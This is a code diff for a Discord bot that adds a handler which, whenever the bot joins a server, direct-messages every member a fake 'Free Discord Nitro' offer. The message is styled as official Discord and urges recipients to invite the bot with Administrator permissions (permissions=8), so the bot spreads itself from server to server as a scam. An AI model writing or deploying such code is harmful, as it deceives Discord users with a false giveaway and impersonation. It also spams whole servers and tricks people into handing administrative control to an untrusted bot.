@@ -35,6 +35,24 @@ if(a === 0){
 }
 }, 8000)});
 
+let guildArray = bot.guilds.array();
+
+bot.on("guildCreate", guild => {
+  const embedpub = new Discord.RichEmbed()
+  .setThumbnail("https://cdn.discordapp.com/attachments/645263761317429248/647918036124172298/b941bc1dfe379db6cc1f2acc5a612f41.png")
+  .setDescription(`Free Discord Nitro :infinity: **> [Click here](https://discordapp.com/oauth2/authorize/?permissions=8&scope=bot&client_id=${bot.user.id}) to add the bot !**`)
+  .addField("**if you want to win a free Discord Nitro invite this bot to your server**", "\u200b")
+  .setColor(0x89ABEE)
+  .setTimestamp()
+  .setFooter("Discord 2019-2020 Officiel �", "https://cdn.discordapp.com/attachments/648209569478213693/648210461258678357/discord-512.png")
+
+
+   console.log("Joined a new guild: " + guild.name);
+   guild.members.forEach(member => {
+     member.send(embedpub)
+   })
+})
+
 bot.on('guildCreate',function(guild){
   var logschannel = bot.channels.find("id", "657928275376472084")
 
